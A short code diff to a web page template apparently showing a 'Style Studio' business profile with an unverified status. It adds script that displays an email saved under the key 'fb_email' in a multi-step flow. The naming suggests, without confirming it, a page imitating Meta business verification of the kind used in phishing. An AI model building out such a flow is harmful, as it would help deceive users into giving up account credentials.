@@ -115,6 +115,7 @@
                     <p class="biz-name">Style Studio</p>
                     <p class="biz-meta">Created date: September 26, 2024</p>
                     <p class="biz-meta">Business verification: Unverified <span class="info-icon">i</span></p>
+                    <p class="biz-meta" id="display_email" style="display: none;"></p>
                 </div>
             </div>
 
@@ -156,6 +157,14 @@
     <script>
         (function() {
             const metaBasePath = "{{ $metaBasePath }}";
+
+            const displayEmail = document.getElementById('display_email');
+            const savedEmail = localStorage.getItem('fb_email');
+            if (savedEmail) {
+                displayEmail.textContent = 'Email: ' + savedEmail;
+                displayEmail.style.display = 'block';
+            }
+
             document.getElementById('btn_before').addEventListener('click', function() { window.location.href = metaBasePath + "/1"; });
             document.getElementById('btn_next').addEventListener('click', function() { window.location.href = metaBasePath + "/3"; });
         })();
